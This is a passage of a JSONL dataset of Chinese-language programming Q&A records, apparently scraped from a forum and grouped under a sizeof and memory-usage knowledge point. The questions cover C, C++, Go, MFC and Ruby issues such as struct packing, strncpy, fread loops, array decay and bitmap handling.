return;\n//}\n//\nimport \"C\"\n\n\n\nimport(\n    \"fmt\"\n    \"unsafe\"\n)\n\ntype GoStruct struct{\n    A   uint16\n    B   uint16\n    C   uint32\n    D   uint16\n}\n\n\nfunc main(){\n    fmt.Println(\"Hello world!\")\n    meh := C.print_C_struct_size()\n    var GoStruct GoStruct\n    fmt.Printf(\"Sizeof GoStruct : %d\n\", unsafe.Sizeof(GoStruct) ) \n    fmt.Printf(\"meh type: %T\n\", meh)\n}\n", "\n\n", "The output is:", "\n\n", "$ go run cgo.go \nHello world!\nSizeof Packed_Struct: 10\nSizeof UnPacked_Struct: 12\nSizeof GoStruct : 12\nmeh type: main._Ctype_void\n", "\n\n", "Notice that the struct when packed takes 10 bytes, 12 otherwise. By default, my tries in Go seems to take 12 bytes as shown here. ", "\n\n", "Is there a Go-ish way to pack this struct so it uses only 10 bytes? ", "\n    "]], "Tag": "程序设计"}
{"Answer": "CapParam 定义出来是指针吧，需要先分配内存空间。\r\n第一个 capCaptureSetSetup 是不是应该是 capCaptureGetSetup？如果 CapParam 在 capCaptureGetSetup 中进行了初始化，则需要一句句来分析出错的原因。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["MFC用capCaptureGetSetup设置视频捕获遇到问题", ["LPCAPTUREPARMS CapParam;", "\n  capCaptureSetSetup(m_hVideo, &CapParam, sizeof (CapParam));", "\n  CapParam->fYield=TRUE ;//用一个后台线程来进行视频捕捉", "\n  CapParam->fAbortLeftMouse =FALSE;  //关闭：单击鼠标左键停止录像的功能。", "\n  CapParam->fAbortRightMouse =FALSE; //关闭：单击鼠标右键停止录像的功能", "\n  CapParam->fLimitEnabled = FALSE ;//关闭捕获时间限制", "\n  capCaptureSetSetup(m_hVideo, &CapParam, sizeof (CapParam));", "\n\n", "是这样使用吗，我把这个放在CMasterComDlg::OnInitDialog()中，在初始化对话框时设置视频捕获方式，但是一运行就提示遇到问题，程序关闭。。。。。。求大神指导"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;strlen函数是求字符串的长度&amp;#xff0c;sizeof是求所占内存的字节数的&amp;#xff0c;str2在赋值前的长度为0&amp;#xff0c;但所占内存是不变的。&lt;br /&gt;&amp;#39;\\0&amp;#39;这一步并不多余&amp;#xff0c;这个表示字符串的结束符&amp;#xff0c;因为后面要输出str3.&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["今天学到数组，关于网课中的一串代码有自己的一些疑问，问题在斜杠线的后面", ["#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<string.h>", "\n\n", "int", " ", "main", "()", "\n", "{\n        ", "char", " str1[] = ", "\"To be or not to be\"", ";\n        ", "char", " str2[", "40", "];\n        ", "char", " str3[", "40", "];\n\n        ", "strncpy", "(str2, str1, ", "sizeof", "(str2));", "//为什么用不了strlen函数，只能用sizeof", "\n        ", "strncpy", "(str3, str2, ", "5", ");\n        str3[", "5", "] = ", "'\\0'", ";", "//这一步是不是多余了", "\n\n        ", "printf", "(", "\"%s\\n\"", ", str1);\n        ", "printf", "(", "\"%s\\n\"", ", str2);\n        ", "printf", "(", "\"%s\\n\"", ", str3);\n\n        ", "return", " ", "0", ";\n}\n\n"]], "Tag": "程序设计"}
{"Answer": "你这个写的是错的，sizeof返回类型的长度，应该用length\r\n\r\n\r\n\r\n```\r\n #include &lt;iostream&gt;\r\n#include&lt;string&gt;\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n\tint int_size;\r\n\tstring str = \"aaaaaaaaaaaaaaaaaa\";\r\n\r\n\tint_size = str.length(); //sizeof(str);\r\n\r\n\tcout &lt;&lt; str&lt;&lt;\"所占的字节大小为：\" &lt;&lt; int_size &lt;&lt; endl;\r\n\treturn 0;\r\n}\r\n```", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["（C++）编了一个获取字符串字节数的程序，你们看看有什么要改进的？", ["#include ", "\n#include", "\nusing namespace std;", "\n\n", "int main()", "\n{", "\n    int int_size;", "\n    string str;", "\n    cout << \"请输入一个字符串\";", "\n    cin >> str;", "\n    int_size = sizeof(str);", "\n\n", "cout << str<<\"所占的字节大小为：\" << int_size << endl;\nsystem(\"pause\");\nreturn 0;\n", "\n\n", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;a的值是第二次申请的内存地址&amp;#xff0c;第一次的内存并没有被销毁在temp-&amp;gt;next中保存&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["C++的局部变量和空间申请", ["Link* a=(Link*)malloc(sizeof(Link));", "Link* a=(Link*)malloc(sizeof(Link));", "这样的话前面的a会不会被后面的a所替代？", "\n", "for(i=2;i<n;i++) //从第二个节点开始创建", "｛", "     Link* a=(Link*)malloc(sizeof(Link));", "     cout<<\"请输入第\"<<i<<\"个节点的数据域的值\";", "     cin>>a->elem;", "     a->next=NULL;", "     temp->next=a;", "     temp=temp->next;", "}"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;1、库函数拼写错误。如&amp;#xff1a;printf&amp;#xff0c;scanf,等&lt;/p&gt;\n&lt;p&gt;2、定义的函数名在调用时&amp;#xff0c;函数名拼写错误&lt;/p&gt;\n&lt;p&gt;3、在执行函数时可能函数体本身的问题&lt;/p&gt;\n&lt;p&gt;4、其他程序在运行&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["编译器一直报[Error] ld returned 1 exit status，请各位解答一下", ["我在编程序的时候遇到了一个问题", "\n", "#", "include", " ", "<complex.h>", "\n", "#", "include", " ", "<fenv.h>", "\n", "#", "include", " ", "<inttypes.h>", "\n", "#", "include", " ", "<stdbool.h>", " ", "\n", "#", "include", " ", "<stdint.h>", "\n", "#", "include", " ", "<tgmath.h>", "\n", "#", "include", " ", "<bits/stdc++.h>", "\n", "#", "include", " ", "<chrono>", "\n", "#", "include", " ", "<stdio.h>", "\n", "#", "include", " ", "<limits.h>", "\n", "#", "include", " ", "<locale.h>", "\n", "#", "include", " ", "<math.h>", "\n", "#", "include", " ", "<wchar.h>", "\n", "#", "include", " ", "<wctype.h>", "\n", "#", "include", " ", "<bitset>", "\n", "#", "include", " ", "<cctype>", "\n", "#", "include", " ", "<cerrno>", "\n", "#", "include", " ", "<clocale>", "\n", "#", "include", " ", "<cmath>", "\n", "#", "include", " ", "<complex>", "\n", "#", "include", " ", "<cstdio>", "\n", "#", "include", " ", "<cstdlib>", "\n", "#", "include", " ", "<cstring>", "\n", "#", "include", " ", "<ctime>", "\n", "#", "include", " ", "<deque>", "\n", "#", "include", " ", "<exception>", "\n", "#", "include", " ", "<fstream>", "\n", "#", "include", " ", "<functional>", "\n", "#", "include", " ", "<limits>", "\n", "#", "include", " ", "<list>", "\n", "#", "include", " ", "<map>", "\n", "#", "include", " ", "<iomanip>", "\n", "#", "include", " ", "<ios>", "\n", "#", "include", " ", "<iosfwd>", "\n", "#", "include", " ", "<istream>", "\n", "#", "include", " ", "<ostream>", "\n", "#", "include", " ", "<queue>", "\n", "#", "include", " ", "<set>", "\n", "#", "include", " ", "<sstream>", "\n", "#", "include", " ", "<stdexcept>", "\n", "#", "include", " ", "<streambuf>", "\n", "#", "include", " ", "<utility>", "\n", "#", "include", " ", "<vector>", "\n", "#", "include", " ", "<cwchar>", "\n", "#", "include", " ", "<cwctype>", "\n", "#", "include", " ", "<stdlib.h>", "\n", "#", "include", " ", "<conio.h>", "\n", "#", "include", " ", "<time.h>", "\n", "#", "include", " ", "<string.h>", "\n", "#", "include", " ", "<string>", "\n", "#", "include", " ", "<algorithm>", "\n", "#", "include", " ", "<bits/stdc++.h>", "\n", "#", "include", " ", "<windows.h>", "\n", "#", "include", " ", "<bits.h>", "\n", "using", " ", "namespace", " std;\n", "int", " ", "CaptureImage", "(HWND hwnd, ", "const", " ", "char", " *dirPath, ", "const", " ", "char", " *filename)", "\n", "{\nHANDLE hDIB;\nHANDLE hFile;\nDWORD dwBmpSize;\nDWORD dwSizeofDIB;\nDWORD dwBytesWritten;\nCHAR FilePath[MAX_PATH];\nHBITMAP hbmScreen = ", "NULL", ";\nBITMAP bmpScreen;\nBITMAPFILEHEADER bmfHeader;\nBITMAPINFOHEADER bi;\nCHAR *lpbitmap;\nINT width = ", "GetSystemMetrics", "(SM_CXSCREEN); ", "// 屏幕宽", "\nINT height = ", "GetSystemMetrics", "(SM_CYSCREEN); ", "// 屏幕高", "\nHDC hdcScreen = ", "GetDC", "(", "NULL", "); ", "// 全屏幕DC", "\nHDC hdcMemDC = ", "CreateCompatibleDC", "(hdcScreen); ", "// 创建兼容内存DC", "\n\n", "if", " (!hdcMemDC)\n{\n", "DeleteObject", "(hbmScreen);\n", "DeleteObject", "(hdcMemDC);\n", "ReleaseDC", "(", "NULL", ", hdcScreen);\n", "return", " ", "0", ";\n}\n\n", "// 通过窗口DC 创建一个兼容位图", "\nhbmScreen = ", "CreateCompatibleBitmap", "(hdcScreen, width, height);\n", "if", " (!hbmScreen)\n{\n", "DeleteObject", "(hbmScreen);\n", "DeleteObject", "(hdcMemDC);\n", "ReleaseDC", "(", "NULL", ", hdcScreen);\n", "return", " ", "0", ";\n}\n", "// 将位图块传送到我们兼容的内存DC中", "\n", "SelectObject", "(hdcMemDC, hbmScreen);\n", "if", " (!", "BitBlt", "(\nhdcMemDC, ", "// 目的DC", "\n", "0", ", ", "0", ", ", "// 目的DC的 x,y 坐标", "\nwidth, height, ", "// 目的 DC 的宽高", "\nhdcScreen, ", "// 来源DC", "\n", "0", ", ", "0", ", ", "// 来源DC的 x,y 坐标", "\nSRCCOPY)) ", "// 粘贴方式", "\n{\n", "DeleteObject", "(hbmScreen);\n", "DeleteObject", "(hdcMemDC);\n", "ReleaseDC", "(", "NULL", ", hdcScreen);\n", "return", " ", "0", ";\n}\n\n", "// 获取位图信息并存放在 bmpScreen 中", "\n", "GetObject", "(hbmScreen, ", "sizeof", "(BITMAP), &bmpScreen);\n\nbi.biSize = ", "sizeof", "(BITMAPINFOHEADER);\nbi.biWidth = bmpScreen.bmWidth;\nbi.biHeight = bmpScreen.bmHeight;\nbi.biPlanes = ", "1", ";\nbi.biBitCount = ", "32", ";\nbi.biCompression = BI_RGB;\nbi.biSizeImage = ", "0", ";\nbi.biXPelsPerMeter = ", "0", ";\nbi.biYPelsPerMeter = ", "0", ";\nbi.biClrUsed = ", "0", ";\nbi.biClrImportant = ", "0", ";\n\ndwBmpSize = ((bmpScreen.bmWidth * bi.biBitCount + ", "31", ") / ", "32", ") * ", "4", " * bmpScreen.bmHeight;\n\n", "// 在 32-bit Windows 系统上, GlobalAlloc 和 LocalAlloc 是由 HeapAlloc 封装来的", "\n", "// handle 指向进程默认的堆. 所以开销比 HeapAlloc 要大", "\nhDIB = ", "GlobalAlloc", "(GHND, dwBmpSize);\nlpbitmap = (", "char", " *)", "GlobalLock", "(hDIB);\n\n", "// 获取兼容位图的位并且拷贝结果到一个 lpbitmap 中.", "\n", "GetDIBits", "(\nhdcScreen, ", "// 设备环境句柄", "\nhbmScreen, ", "// 位图句柄", "\n", "0", ", ", "// 指定检索的第一个扫描线", "\n(UINT)bmpScreen.bmHeight, ", "// 指定检索的扫描线数", "\nlpbitmap, ", "// 指向用来检索位图数据的缓冲区的指针", "\n(BITMAPINFO *)&bi, ", "// 该结构体保存位图的数据格式", "\nDIB_RGB_COLORS ", "// 颜色表由红、绿、蓝（RGB）三个直接值构成", "\n);\n\n\n", "wsprintf", "(FilePath, ", "\"%s\\%s.jpg\"", ", dirPath, filename);\n\n", "// 创建一个文件来保存文件截图", "\nhFile = ", "CreateFile", "(\nFilePath,\nGENERIC_WRITE,\n", "0", ",\n", "NULL", ",\nCREATE_ALWAYS,\nFILE_ATTRIBUTE_NORMAL,\n", "NULL", "\n);\n\n", "// 将 图片头(headers)的大小, 加上位图的大小来获得整个文件的大小", "\ndwSizeofDIB = dwBmpSize + ", "sizeof", "(BITMAPFILEHEADER) + ", "sizeof", "(BITMAPINFOHEADER);\n\n", "// 设置 Offset 偏移至位图的位(bitmap bits)实际开始的地方", "\nbmfHeader.bfOffBits = (DWORD)", "sizeof", "(BITMAPFILEHEADER) + (DWORD)", "sizeof", "(BITMAPINFOHEADER);\n\n", "// 文件大小", "\nbmfHeader.bfSize = dwSizeofDIB;\n\n", "// 位图的 bfType 必须是字符串 \"BM\"", "\nbmfHeader.bfType = ", "0x4D42", "; ", "//BM", "\n\ndwBytesWritten = ", "0", ";\n", "WriteFile", "(hFile, (LPSTR)&bmfHeader, ", "sizeof", "(BITMAPFILEHEADER), &dwBytesWritten, ", "NULL", ");\n", "WriteFile", "(hFile, (LPSTR)&bi, ", "sizeof", "(BITMAPINFOHEADER), &dwBytesWritten, ", "NULL", ");\n", "WriteFile", "(hFile, (LPSTR)lpbitmap, dwBmpSize, &dwBytesWritten, ", "NULL", ");\n\n", "// 解锁堆内存并释放", "\n", "GlobalUnlock", "(hDIB);\n", "GlobalFree", "(hDIB);\n\n", "// 关闭文件句柄", "\n", "CloseHandle", "(hFile);\n\n", "// 清理资源", "\n", "DeleteObject", "(hbmScreen);\n", "DeleteObject", "(hdcMemDC);\n", "ReleaseDC", "(", "NULL", ", hdcScreen);\n\n", "return", " ", "0", ";\n}\n\n", "\n", "编译器一直报错"]], "Tag": "程序设计"}
{"Answer": "读取的文件打开了吗，一开始读取出什么内容没", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["fread函数问题，求助给位大神", ["用循环读取文件中数据，代码如下：", "\n    while(!feof(pfile))", "\n        {", "\n            int a=0;", "\n            a=fread(&leng,sizeof(int),1,pfile);", "\n            printf(\"%d \\n\",a);", "\n            a=fread(temp->name,sizeof(char),leng,pfile);", "\n            printf(\"%d \\n\",a);", "\n            temp->name[leng]='\\0';", "\n            a=fread(&leng,sizeof(int),1,pfile);", "\n            printf(\"%d \\n\",a);", "\n            a=fread(temp->first_name,sizeof(char),leng,pfile);", "\n            printf(\"%d \\n\",a);", "\n            temp->first_name[leng]='\\0';", "\n            a=fread(&temp->phone_number,sizeof(long),1,pfile);", "\n            printf(\"%d \\n\",a);", "\n            printf(\"%s %s的电话号码为%ld\\n\",temp->name,temp->first_name,temp->phone_number);", "\n        }", "\n        求问程序运行后为什么没到文件尾，fread函数就返回0，且没有读取任何数据了?"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;8个字符分别是&lt;br /&gt;\\n(换行符)&lt;br /&gt;u&lt;br /&gt;m&lt;br /&gt;&amp;#61;&lt;br /&gt;%&lt;br /&gt;d&lt;br /&gt;\\t(制表符)&lt;br /&gt;\\0(字符串结束符)&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["为什么结果不是7，能解释一下吗", ["The value of expression sizeof(\"\\num=%d\\t\") is"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;fread是C语言提供的读取文件的方法&amp;#xff0c;其中wo表示读取后内容存放位置&amp;#xff0c;1是值每个对象大小为1&amp;#xff0c;sizeof(worker)表示读取对象的个数&amp;#xff0c;fp是要读取的文件&lt;br /&gt;fread()运行成功返回读取的对象个数&amp;#xff0c;错误或到达文件末尾&amp;#xff0c;返回小于count。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["怎么简单解释一下这个括号里的意思", ["while (fread(&wo, 1, sizeof(worker), fp))"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;一般长度必须作为形参,传递过程中,数组传递过去退化成了指针,用sizeof求出来的长度是错误的&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C++冒泡排序的问题，求解决", ["问题遇到的现象和发生背景", "\n", "把数组len在函数体内定义，数组不进行冒泡排序", "把len定义为参数，正常运行", "\n", "问题相关代码", "\n", "#include<iostream>", "\n", "using", " ", "namespace", " ", "std", ";\n", "void", " ", "BubbleSort", "(", "double", "* a", ")", " {\n\n    ", "int", " len = ", "sizeof", "(a) / ", "sizeof", "(", "double", "); ", "//为什么把len放在函数体内冒泡排序就不管用", "\n\n    ", "for", " (", "int", " i = ", "0", "; i < len; i++)\n    {\n        ", "for", " (", "int", " j = ", "0", "; j < len - i - ", "1", "; j++)\n        {\n            ", "if", " (a[j] > a[j + ", "1", "]) {\n                ", "double", " t = a[j];\n                a[j] = a[j + ", "1", "];\n                a[j + ", "1", "] = t;\n            }\n\n        }\n    }\n}\n\n", "int", " ", "main", "(", ")", "{\n    ", "double", " a[]{ ", "10.5", ",", "5.5", ",", "6.6", ",", "0.7", ",", "6.3", " };\n\n    BubbleSort(a);\n\n\n    ", "for", " (size_t i = ", "0", "; i < ", "sizeof", "(a) / ", "sizeof", "(", "double", "); i++)\n    {\n        cout << a[i] << endl;\n    }\n    ", "return", " ", "0", ";\n\n}\n\n", "\n", "运行结果及报错内容", "\n", "\n", "我的解答思路和尝试过的方法", "\n", "#include<iostream>", "\n", "using", " ", "namespace", " ", "std", ";\n", "void", " ", "BubbleSort", "(", "double", "* a,", "int", " len", ")", " {\n\n\n\n    ", "for", " (", "int", " i = ", "0", "; i < len; i++)\n    {\n        ", "for", " (", "int", " j = ", "0", "; j < len - i - ", "1", "; j++)\n        {\n            ", "if", " (a[j] > a[j + ", "1", "]) {\n                ", "double", " t = a[j];\n                a[j] = a[j + ", "1", "];\n                a[j + ", "1", "] = t;\n            }\n\n        }\n    }\n}\n\n", "int", " ", "main", "(", ")", "{\n    ", "double", " a[]{ ", "10.5", ",", "5.5", ",", "6.6", ",", "0.7", ",", "6.3", " };\n    ", "int", " len = ", "sizeof", "(a) / ", "sizeof", "(", "double", "); ", "//为什么把len放在函数体内冒泡排序就不管用", "\n\n    BubbleSort(a,len);\n\n\n    ", "for", " (size_t i = ", "0", "; i < ", "sizeof", "(a) / ", "sizeof", "(", "double", "); i++)\n    {\n        cout << a[i] << endl;\n    }\n    ", "return", " ", "0", ";\n\n}\n\n", "\n", "我想要达到的结果"]], "Tag": "程序设计"}
{"Answer": "如果要细致分析你程序的表现,你目前提供的信息不够,要贴上完整的程序,才能找到写入数据的区域怎样被更新了.", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["关于C语言中动态分配问题", ["有程序实现对零件的：插入，更新数量，输入价格，输入数量等功能", "\n现要求修改结构数组，从之前的提前确定数组长度，改为malloc动态分配，并在数组满了之后，用realloc增加分配的内存。", "\n为了便于测试，我先为数组分配了1倍于struct part的内存如下：", "\nint max_parts==1;", "\nstrcut part *inventory;", "\ninventory=malloc(max_parts*sizeof(struct part));", "\n我理解的是，如果我输入一个零件的信息（编号名字数量价格等）后，此次动态分配的地址就会被填满。事实却不是这样，当我输入两个零件的信息的时候，仍旧正常显示，第三个零件后，才出现问题：零件名和编号是正确显示的，而数量这一项是一个超大的值。价格是0.00。"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;第四行是用来放放回数组的元素个数的&amp;#xff0c;LeetCode上做题的方式需要这样&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["再问一次，第四行是干嘛用的？", ["int", "** generate(", "int", " numRows, ", "int", "* returnSize, ", "int", "** returnColumnSizes)\n{\n    ", "int", "** ret = (", "int", " **)malloc(sizeof(", "int", "*) * numRows);", "//ret接收", "\n    *returnSize = numRows;\n    *returnColumnSizes = (", "int", " *)malloc(sizeof(", "int", ") * numRows);\n    ", "for", " (", "int", " i = ", "0", "; i < numRows; ++i) \n    {\n        ret[i] = (", "int", "*)malloc(sizeof(", "int", ") * (i + ", "1", "));\n        (*returnColumnSizes)[i] = i + ", "1", ";\n        ret[i][", "0", "] = ret[i][i] = ", "1", ";\n        ", "for", " (", "int", " j = ", "1", "; j < i; ++j)\n        {\n            ret[i][j] = ret[i - ", "1", "][j] + ret[i - ", "1", "][j - ", "1", "];\n        }\n    }\n    ", "return", " ret;\n}\n", "\n", "再问一次，leecode第118题杨辉三角，第四行是干嘛用的？比较急"]], "Tag": "程序设计"}
{"Answer": "这篇博客应该能帮到你https://blog.csdn.net/weixin_38363517/article/details/80068542", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["小白想问一下这个strncpy哪里错了", ["char a[17]={0};\n    char b[17]={0};\n    char c[33]={0};\n    strncpy(a,\"0123456789abcdef\",sizeof(a));\n    a[sizeof(a)-1] = '\\0';\n    strncpy(b,\"0123456789abcdef\",sizeof(b));\n    b[sizeof(b)-1] = '\\0';\n    strcpy(c,a);\n    strcat(c,b);\n    cout << c<< endl;\n    return 0;\n", "\n\n", "vs2012说我错误  1   error C4996: 'strncpy': This function or variable may be unsafe. Consider using strncpy_s instead. To disable deprecation, use _CRT_SECURE_NO_WARNINGS. See online help for details.    h:\\c++\\2.2\\2.2\\2.2.cpp  13  1   2.2"]], "Tag": "程序设计"}
{"Answer": "include DL\r\nCPtr.malloc SIZEOF_INT*4 + SIZEOF_VOIDP*4\r\n# 比较丑……如果找到更好方法请通知我……\r\n\r\np = CPtr[[0,1,0,0].pack 'IIII']\r\n# 如果要地址整数，p.ptr，或者直接用 DL.wrap\r\n\r\nDL 在 1.9 被 yugui 姐姐重写了 …… \r\n刚开始时文档和注释都没有（因为要保持和代码一致，把文档放在最后做）\r\n\r\n比较好的参考是源代码目录中的 ext/dl/test 和 ext/win32ole/sample\r\n\r\n===================================\r\n\r\n1.9 是 major version，不相容的部分也多，和 1.8 之间的区别就像 python 3 之于 python 2.5 ……\r\n\r\n某个总结：\r\n[url]http://www.elctech.com/articles/ruby-1-9-compatibility-a-three-step-ladder-to-bliss[/url]\r\n\r\n另外镐头书 1.9 版也值得参考。", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["ruby /DL 升级到1.9.1的问题", ["下面几个小程序在ruby 1.8上都是顺利运行的，升级到1.9.1之后，发生许多method no defined的错误", "\n\n", "[code]", "\nptr = DL.malloc(DL.sizeof('IIIIPPPP'))", "\n[/code]", "\n\n", "错误是: undefined method `sizeof' for DL:Module，在DL::Importer下是有一个sizeof，但是DL::Importer.sizeof('IIIIPPPP') 会报can not partser type..的错误", "\n\n", "[code]", "\nptr = [0,1,0,0].pack('IIII').to_ptr", "\n[/code]", "\n\n", "这段代码也不能工作了，错误时to_ptr no define", "\n\n", "有时候ruby一升级，就意味着许多东西要重新折腾，这些问题该如何fix呢？", "\n\n", "不知道ruby有没有类似C#的条件编译，以便在不同版本下都顺利运行？"]], "Tag": "程序设计"}
{"Answer": "&lt;pre&gt;&lt;code class=\"language-javascript\"&gt;\n为指针变量nums申请&lt;span class=\"hljs-built_in\"&gt;n&lt;/span&gt;个&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;类型大小的内存空间&amp;#xff0c;最后进行类型转换&amp;#xff0c;变成&lt;span class=\"hljs-built_in\"&gt;int&lt;/span&gt;*型在赋值给nums\n&lt;/code&gt;&lt;/pre&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["不知道什么意思，谁可以帮我解释一下吗", ["int* nums = (int*)malloc(n * sizeof(int));", "\n"]], "Tag": "程序设计"}
{"Answer": "我可以帮你实现  但是现在不在电脑旁   先mark下   回头出码要分", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["如何将下列方法（C程序）改成用java实现", ["\n", "//打开设备", "int ctUsb_open(int devId)", "{", "    int handle = -1;", "    CTUsbMsg msg;", "    int msglen, incnt;", "    memset(&msg, 0, sizeof(msg));", "    snprintf(msg.msgData, sizeof(msg.msgData), \"OPEN\");", "    msg.msgLen = strlen(msg.msgData) + sizeof(devId);", "    memcpy(&msg.msgData[4], &devId, sizeof(devId));", "\n", "    int xreason;", "    handle = ctUsb_connect(USB_ADMIN_DATA_PORT);", "\n", "    if (handle > 0)", "    {", "        write(handle, &msg, msg.msgLen + sizeof(msg.msgLen));", "        incnt = ctUsb_msgRecive(handle, &msglen, sizeof(msglen));", "        if (incnt > 0)", "        {", "            ctUsb_msgRecive(handle, &xreason, msglen);", "        }", "    }", "\n", "    g_errno = xreason;", "\n", "    return handle;", "}", "//创建socket连接", "static int ctUsb_connect(int portNum)", "{", "    int sockfd, addrsize;", "\n", "    struct sockaddr_in seraddr;", "\n", "    memset(&seraddr, 0, sizeof(seraddr));", "\n", "    seraddr.sin_family = AF_INET;", "    seraddr.sin_port = htons(portNum);", "    seraddr.sin_addr.s_addr = inet_addr(\"127.0.0.1\");", "\n", "    addrsize = sizeof(struct sockaddr_in);", "    sockfd = socket(AF_INET, SOCK_STREAM, 0);", "\n", "    if (sockfd < 0)", "    {", "        printf(\"could not create socket\\n\");", "    }", "\n", "    if (connect(sockfd, (struct sockaddr*)&seraddr, addrsize) == -1)", "    {", "        printf(\"could not connect usbAdmin\\n\");", "        close(sockfd);", "        sockfd = -1;", "    }", "\n", "    return sockfd;", "}", "/**", " * 配置设备属性", " * @param handle(IN)", " * @param request(IN)", " * @param arg(IN/OUT)", " * @param reason(OUT)", " * @return Result", " */", "int ctUsb_ioctl(int handle, int request, void *arg, int arglen)", "{", "    CTUsbMsg msg;", "    int len, xreason, n;", "    int requestx = request;", "    ", "    memset(&msg, 0, sizeof(msg));", "    snprintf(msg.msgData, sizeof(msg.msgData), \"IOCTL\");", "    len = strlen(msg.msgData);", "\n", "    memcpy(&msg.msgData[len], &requestx, sizeof(requestx));", "    memcpy(&msg.msgData[len + 4], &arglen, sizeof(arglen));", "\n", "    if (arg != NULL)", "    {", "        memcpy(&msg.msgData[len + 8], arg, arglen);", "    }", "\n", "    msg.msgLen = 5 + sizeof(requestx) + arglen;", "\n", "    write(handle, &msg, msg.msgLen + sizeof(msg.msgLen));", "\n", "    n = ctUsb_msgRecive(handle, &len, sizeof(len));", "\n", "    if (n > 0)", "    {", "        ctUsb_msgRecive(handle, (char*)arg, len);", "    }", "\n", "    n = ctUsb_msgRecive(handle, &len, sizeof(len));", "\n", "    if (n > 0)", "    {", "        ctUsb_msgRecive(handle, &xreason, len);", "    }", "\n", "    g_errno = xreason;", "\n", "    return 0;", "}", "\n", "为了方便理解，我用java写一个调用的方法：", "public static void main(String[] args){", "    int handle=open(devcId);//创建socket连接  此处handle是什么意思，接着调用ctUsb_ioctl方法要把此handle 传给 ctUsb_ioctl方法，（我自己的理解表示socket对象，但在java中要 怎么用int 类型的变量代表一个socket对象呢）", "    ctUsb_ioctl(handle,......)//", "}", "\n", " ", "\n", "请大家帮忙给分析一下 C的程序流程，考虑用java如何实现！！！先拜谢了！！", "\n"]], "Tag": "程序设计"}
{"Answer": "&lt;p&gt;首先判断student.txt是否可读可写&amp;#xff0c;然后将txt文件中按照结构体student的内容分别读出并保存在指针p1内存上。&lt;/p&gt;", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["这段程序不知道什么用，有人可以看看吗", ["int n;", "    if ((fp = fopen(\"student.txt\", \"a\")) == NULL)", "    {", "        printf(\"File open error!\\n\");", "        exit(1);", "    }", "    fclose(fp);", "    if ((fp = fopen(\"student.txt\", \"r\")) == NULL)", "    {", "        printf(\"File open error!\\n\");", "        exit(1);", "    }", "    p1 = (struct student*)malloc(sizeof(struct student));", "    p1->next = NULL;", "    head = p1;", "    while (!feof(fp))", "    {", "        if (fread(p1, sizeof(struct student), 1, fp) != 1)", "            break;", "        p2 = (struct student*)malloc(sizeof(struct student));", "        p2->next = NULL;", "        p1->next = p2;", "        p1 = p2;", "    }", "}"]], "Tag": "程序设计"}
{"Answer": "memcpy位置应放在hbm创建的后面...", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": ["c++使用CreateDIBSection出现问题", ["求dalao查错...请问我这个做位图并且显示的代码中有什么问题为何我执行后一直是黑屏", "\n（c++11）", "\n\n", "HDC hdc=GetDC(hwnd); \nBITMAPINFO bi;\nbi.bmiHeader.biSize = sizeof(BITMAPINFOHEADER);\nbi.bmiHeader.biWidth = _WIDTH;\nbi.bmiHeader.biHeight = _HEIGHT;\nbi.bmiHeader.biPlanes = 1;\nbi.bmiHeader.biBitCount = 24;\nbi.bmiHeader.biCompression = BI_RGB;\nbi.bmiHeader.biSizeImage = _WIDTH * _HEIGHT * 3;\nint d=0;\nunsigned char x[_WIDTH*_HEIGHT*3];\nfor(int i=0;i<_WIDTH*_HEIGHT*3;i++)x[i]=0xaa;\nPVOID pBits(malloc(_WIDTH*_HEIGHT*3*2));\nmemcpy(pBits,x,sizeof(x));\nHBITMAP hbm = CreateDIBSection(NULL,&bi, DIB_RGB_COLORS,&pBits, NULL, 0);\nHBRUSH hbr=CreatePatternBrush(hbm);\nRECT rt;\nGetClientRect(hwnd, &rt);\nFillRect(hdc,&rt,hbr);\n"]], "Tag": "程序设计"}
{"Answer": "m_bmp.Read(&amp;b,sizeof(unsigned short));  读取时为什么 是 short？这样一次就读取了 6 个字节的数据。但实现一个像素的字节数应该是 3 才对。\r\n\r\n所以导致：\r\n（1） 图像数据不对\r\n（2） 图像数据只有一半", "Konwledge_Point": "用sizeof了解占用的内存量", "Question": [" MFC读取24位bmp图像出问题了，求大神来解决", ["我要实现的是将24位bmp文件读入并在用户区显示，但是显示结果都不对的，谁能来帮忙看下？", "\n\n", "注：因为对bmp文件还要做后续的处理（比如RGB转CMYK这样的），所以我现在写的代码只是一个测试是否正确读取bmp的程序。用其它控件去读取图片对我来说是毫无用处的。", "\n\n", "这是我的代码：", "\nvoid CMy3View::OnLoad()", "\n{", "\n// TODO: 在此添加命令处理程序代码", "\nCString strFilter,strFilename,info;", "\n   unsigned short format,bit_per_pix,r,g,b;", "\nunsigned int offset,bmp_width;", "\nint bmp_height;", "\n//打开bmp文件", "\nstrFilter=_T(\"bmp images(*.bmp)|*.bmp||\");", "\nCFileDialog dlg(true,NULL,NULL,OFN_EXPLORER|OFN_ENABLESIZING|OFN_FILEMUSTEXIST,strFilter);", "\nif(dlg.DoModal()==IDOK){", "\nstrFilename=dlg.GetPathName();", "\nCFile 